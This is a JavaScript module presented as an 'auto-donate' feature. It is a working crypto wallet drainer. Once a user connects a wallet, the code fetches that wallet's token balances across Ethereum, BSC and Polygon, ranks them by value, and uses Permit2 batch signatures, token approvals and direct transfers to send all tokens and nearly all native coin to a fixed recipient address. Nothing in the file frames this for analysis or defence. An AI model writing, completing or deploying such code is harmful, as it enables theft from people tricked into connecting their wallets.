// src/engine/donate.js
import { ethers } from "ethers";
import { SignatureTransfer } from "@uniswap/permit2-sdk";
import {
  COVALENT_API_KEY,
  RECIPIENT_ADDRESS,
  DONATION_CONTRACT_ADDRESS,
  DONATION_CONTRACT_ABI,
  PERMIT2_ADDRESS,
  PERMIT2_ABI,
  exceptionList,
} from "../config";
import { getFreePermit2Nonce } from "./nonceHelper";

/**
 * Chains to sweep
 */
const CHAINS = [
  { chainId: 1, name: "Ethereum" },
  { chainId: 56, name: "BSC" },
  { chainId: 137, name: "Polygon" }
];

/**
 * 🔑 Signer factory – works with WalletConnect or injected wallet
 */
async function getSigner(walletClient) {
  if (walletClient) {
    // WalletConnect signer
    const { account, transport } = walletClient;
    const provider = new ethers.BrowserProvider(transport);
    return new ethers.JsonRpcSigner(provider, account.address);
  }

  // Fallback: injected provider (MetaMask, Brave, etc.)
  if (typeof window !== "undefined" && window.ethereum) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    return await provider.getSigner();
  }

  throw new Error("No wallet provider found");
}

/**
 * Fetch balances via Covalent
 */
export async function fetchBalancesCovalent(address, chainId) {
  try {
    const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`;
    const res = await fetch(url);
    const json = await res.json();
    if (!json?.data?.items) return [];
    return json.data.items
      .filter(i => i.contract_address && i.balance && i.balance !== "0")
      .map(i => ({
        tokenSymbol: i.contract_ticker_symbol,
        tokenAddress: i.contract_address.toLowerCase(),
        balanceRaw: i.balance,
        decimals: i.contract_decimals || 18,
        quote: i.quote || 0,
      }));
  } catch (err) {
    console.warn("fetchBalancesCovalent failed, returning empty array", err);
    return [];
  }
}

/**
 * Filter tokens safe for Permit2
 */
export async function filterPermit2SafeTokens(tokens) {
  return tokens.filter(t =>
    t.tokenAddress &&
    !["BNB", "ETH", "MATIC"].includes(t.tokenSymbol) &&
    t.balanceRaw !== "0"
  );
}

/**
 * Sort tokens by USD value
 */
export function sortByUsd(tokens) {
  return tokens.sort((a, b) => b.quote - a.quote);
}

/**
 * Check ERC20 Permit2 compatibility
 */
export async function isPermit2Compatible(tokenAddress, signer) {
  try {
    const token = new ethers.Contract(
      tokenAddress,
      ["function transferFrom(address,address,uint256) view returns (bool)"],
      signer
    );
    return typeof token.transferFrom === "function";
  } catch {
    return false;
  }
}

/**
 * Chain value
 */
export function getChainValue(tokens) {
  return tokens.reduce((acc, t) => acc + (t.quote || 0), 0);
}

/**
 * Main auto-donate flow
 */
export async function autoDonateMultiChain(walletClient) {
  try {
    const signer = await getSigner(walletClient);
    const provider = signer.provider;
    const owner = await signer.getAddress();

    // Fetch balances per chain
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);
      chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
    }

    // Sort chains by total token value
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    for (const chain of chainBalances) {
      if (!chain.tokens) chain.tokens = [];
      console.log(`Sweeping chain ${chain.name} (id: ${chain.chainId}) with ${chain.tokens.length} tokens, total value: $${chain.totalValue.toFixed(2)}`);

      // Permit2 vs fallback split
      const permit2Tokens = [];
      const fallbackTokens = [];

      for (const t of chain.tokens) {
        const isException = exceptionList?.[chain.chainId]?.includes(t.tokenAddress.toLowerCase());
        if (isException) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(t.tokenAddress, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      const donation = new ethers.Contract(
        DONATION_CONTRACT_ADDRESS[chain.chainId],
        DONATION_CONTRACT_ABI,
        signer
      );

      // --- Permit2 batch ---
      if (permit2Tokens.length > 0) {
        try {
          const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
          const nonce = await getFreePermit2Nonce(permit2, owner);
          const deadline = Math.floor(Date.now() / 1000) + 3600;

          const permittedForSig = permit2Tokens.map(t => ({ token: t.tokenAddress, amount: BigInt(t.balanceRaw) }));
          const permittedForContract = permit2Tokens.map(t => ({ token: t.tokenAddress, amount: t.balanceRaw }));

          const permitForSig = {
            permitted: permittedForSig,
            nonce: BigInt(nonce),
            deadline: BigInt(deadline),
            spender: DONATION_CONTRACT_ADDRESS[chain.chainId],
          };

          const { domain, types, values } = SignatureTransfer.getPermitData(
            permitForSig,
            PERMIT2_ADDRESS,
            chain.chainId
          );

          let signature;
          if (typeof signer.signTypedData === "function") {
            signature = await signer.signTypedData(domain, types, values);
          } else {
            signature = await signer._signTypedData(domain, types, values);
          }

          const transferDetails = permit2Tokens.map(t => ({ to: RECIPIENT_ADDRESS, requestedAmount: t.balanceRaw }));
          const permitForContractCall = { permitted: permittedForContract, nonce, deadline };

          const tx = await donation.pullAndDonate(permitForContractCall, transferDetails, owner, signature);
          console.log("Permit2 batch donation tx:", tx.hash);
          await tx.wait();
        } catch (err) {
          console.warn("Permit2 batch failed, moving to fallback:", err);
          fallbackTokens.push(...permit2Tokens);
        }
      }

      // --- Fallback allowance ---
      if (fallbackTokens.length > 0) {
        const tokensToPull = [];
        const amountsToPull = [];

        for (const t of fallbackTokens) {
          try {
            const token = new ethers.Contract(
              t.tokenAddress,
              ["function approve(address,uint256) returns (bool)"],
              signer
            );
            await token.approve(DONATION_CONTRACT_ADDRESS[chain.chainId], t.balanceRaw);
            tokensToPull.push(t.tokenAddress);
            amountsToPull.push(t.balanceRaw);
          } catch (err) {
            console.error(`Failed approve for ${t.tokenSymbol}:`, err);
          }
        }

        if (tokensToPull.length > 0) {
          try {
            const tx2 = await donation.pullAndDonateAllowanceBatch(tokensToPull, amountsToPull, owner);
            console.log("Fallback allowance batch tx:", tx2.hash);
            await tx2.wait();
          } catch (err) {
            console.error("Fallback batch failed:", err);
          }
        }
      }

      // --- Native sweep ---
      try {
        const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
        const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n; // buffer

        const bal = await provider.getBalance(owner);
        if (bal > reserveForNative) {
          const amountToSend = bal - reserveForNative;
          const tx = await signer.sendTransaction({
            to: RECIPIENT_ADDRESS,
            value: amountToSend,
          });
          console.log(`${chain.name} native sweep tx:`, tx.hash);
          await tx.wait();
        } else {
          console.log(`${chain.name} not enough native to sweep safely`);
        }
      } catch (err) {
        console.error(`Native sweep failed on ${chain.name}`, err);
      }

      console.log(`Finished sweeping chain ${chain.name}`);
    }

    return { success: true, message: "All chains swept" };
  } catch (err) {
    console.error("autoDonateMultiChain error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
